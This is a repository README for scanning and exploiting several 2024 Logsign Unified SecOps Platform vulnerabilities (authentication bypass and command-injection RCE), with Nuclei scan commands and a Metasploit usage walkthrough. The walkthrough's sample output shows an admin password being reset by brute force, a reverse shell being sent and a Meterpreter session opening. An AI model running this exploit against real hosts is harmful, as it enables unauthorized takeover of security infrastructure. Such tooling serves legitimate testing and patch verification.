# Logsign Unified SecOps Platform Nuclei Template Scanner

## Explanation:

This repository contains Nuclei template for detecting multiple vulnerabilities in Logsign Unified SecOps Platform. The template are designed to identify the following vulnerabilities:

- **ZDI-CAN-24164 > CVE-2024-5716**: Logsign Unified SecOps Platform Authentication Bypass Vulnerability
- **ZDI-CAN-24165 > CVE-2024-5717**: Logsign Unified SecOps Platform Command Injection Remote Code Execution Vulnerability
- **ZDI-CAN-24166 > CVE-2024-5718**: Logsign Unified SecOps Platform Missing Authentication Remote Code Execution Vulnerability
- **ZDI-CAN-24167 > CVE-2024-5719**: Logsign Unified SecOps Platform Command Injection Remote Code Execution Vulnerability
- **ZDI-CAN-24168 > CVE-2024-5720**: Logsign Unified SecOps Platform Command Injection Remote Code Execution Vulnerability
- **ZDI-CAN-24169 > CVE-2024-5721**: Logsign Unified SecOps Platform Missing Authentication Remote Code Execution Vulnerability
- **ZDI-CAN-24170 > CVE-2024-5722**: Logsign Unified SecOps Platform HTTP API Hard-coded Cryptographic Key Remote Code Execution Vulnerability

The metasploit exploit phase will be updated...

## Usage

To use these template with Nuclei, follow the example steps below:

### Clone the repository:

```sh
git clone https://github.com/j4nk3/Logsign-RCE.git
cd Logsign-RCE
```
### Usage with Nuclei:

**Single Target:**
```sh
nuclei -u https://target.com -t logsign-unauth-rce.yaml -nh
```
**Multiple Target:**
```sh
nuclei -l urls.txt -t logsign-unauth-rce.yaml -nh
```

### Usage with Metasploit
```
# Step 1: Copy the .rb file to the Metasploit modules directory
sudo cp logsign-unauth-rce.rb /usr/share/metasploit-framework/modules/auxiliary/exploit/

# Step 2: Start Metasploit
msfconsole

# Step 3: Load the module
msf6 > use auxiliary/exploit/logsign-unauth-rce

# Step 4: Set the required options
msf6 auxiliary(exploit/logsign-unauth-rce) > set TARGETURI /
msf6 auxiliary(exploit/logsign-unauth-rce) > set USERNAME admin
msf6 auxiliary(exploit/logsign-unauth-rce) > set LHOST 0.0.0.0
msf6 auxiliary(exploit/logsign-unauth-rce) > set LPORT 1337
msf6 auxiliary(exploit/logsign-unauth-rce) > set RHOSTS 192.168.1.10
msf6 auxiliary(exploit/logsign-unauth-rce) > set RPORT 443

# Step 5: Run the exploit
msf6 auxiliary(exploit/logsign-unauth-rce) > run

[*] Resetting admin password using CVE-2024-5716...
[*] Forget password request sent for user: admin
[*] Successfully brute-forced reset code: 123456, verification code: 7890
[*] Password successfully reset to: Hkdi2983jdlGfdLS
[*] Successfully logged in with the new password. Session cookie: PHPSESSID=abcd1234...
[*] Sending reverse shell payload...
[*] Exploit completed, waiting for session...

[*] Meterpreter session 1 opened (192.168.1.100:1337 -> 192.168.1.10:443) at 2024-08-12 12:34:56 +0000
msf6 auxiliary(exploit/cve_2024_5716_5717_pre_auth_rce) >

```

Many thanks to @mdisec (Mehmet Ince) for the security research and critical finding detections performed on this product.

## Contributing
Feel free to submit issues or pull requests if you find any bugs or have suggestions for improvements.

## License
This project is licensed under the MIT License.

## References
[Logsign Support](https://support.logsign.net/hc/en-us/articles/19316621924754-03-06-2024-Version-6-4-8-Release-Notes)<br>
[Zero Day Inititive](https://www.zerodayinitiative.com/blog/2024/7/1/getting-unauthenticated-remote-code-execution-on-the-logsign-unified-secops-platform)
